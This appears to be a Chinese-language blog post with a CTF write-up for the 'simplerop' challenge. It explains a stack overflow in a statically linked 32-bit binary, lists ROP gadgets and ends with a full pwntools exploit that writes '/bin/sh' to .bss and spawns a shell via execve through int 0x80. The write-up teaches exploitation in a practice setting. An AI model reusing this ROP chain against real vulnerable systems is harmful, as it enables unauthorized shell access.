---
layout: post
title:  simplerop
date:   2022-09-26 00:08:01 +0300
image:  2022-09-26-cat.jpg
tags:   [ctf,pwn,ubuntu16,ROP,cmcc]
---

main

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h] BYREF

  puts((int)"ROP is easy is'nt it ?");
  printf("Your input :");
  fflush(stdout);
  return read(0, &v4, 0x64);
}
```

 栈溢出，但是这个文件是静态编译的，不能使用像之前泄露got表那样的方法

可以发现存在`int 80`，这么一来，可以执行系统调用了。

```assembly
ROPgadget --binary simplerop --only "int|80"
Gadgets information
============================================================
0x080493e1 : int 0x80

Unique gadgets found: 1
```

因为系统调用，需要我们执行这样的命令：`int80(11,"/bin/sh",null,null)`

|  NR  | syscall name |                          references                          | %eax |     arg0 (%ebx)      |       arg1 (%ecx)       |       arg2 (%edx)       | arg3 (%esi) | arg4 (%edi) | arg5 (%ebp) |
| :--: | :----------: | :----------------------------------------------------------: | :--: | :------------------: | :---------------------: | :---------------------: | :---------: | :---------: | :---------: |
|  3   |     read     | [man/](https://man7.org/linux/man-pages/man2/read.2.html) [cs/](https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read) | 0x03 |   unsigned int fd    |        char *buf        |      size_t count       |      -      |      -      |      -      |
|  11  |    execve    | [man/](https://man7.org/linux/man-pages/man2/execve.2.html) [cs/](https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve) | 0x0b | const char *filename | const char *const *argv | const char *const *envp |      -      |      -      |      -      |

这道题目没有给出字符串，需要我们自己输入，这道题没有开启pie，可以考虑用`read()`将`/bin/sh`写入到bss段中。

```assembly
ROPgadget --binary simplerop --only "pop|ret" | grep eax
0x0809da8a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bae06 : pop eax ; ret
0x08071e3a : pop eax ; ret 0x80e
0x0809da89 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

ROPgadget --binary simplerop --only "pop|ret" | grep ebx | grep ecx
0x0806e851 : pop ecx ; pop ebx ; ret
0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
```

IDA中给出的距离ebp的地址是`0x14`，用gdb调试了下才发现距离是`0x1c`

exp

```assembly
from pwn import *

io = remote("node4.buuoj.cn", 27372)

elf = ELF("./simplerop")

int80 = 0x080493e1
pop_eax = 0x80bae06
read_addr = 0x0806CD50
bss = 0x080EB584
pop_edx_ecx_ebx = 0x0806e850

payload = b'M'*(0x1c+4) + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss) + p32(0x8)  # read函数的返回地址用三个pop代替，正好将read函数的三个参数弹出栈，这样就可以执行下面的系统调用了
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss) + p32(int80)

# io.recvuntil("Your input :")
io.sendline(payload)
io.sendline('/bin/sh\x00')

io.interactive()
```

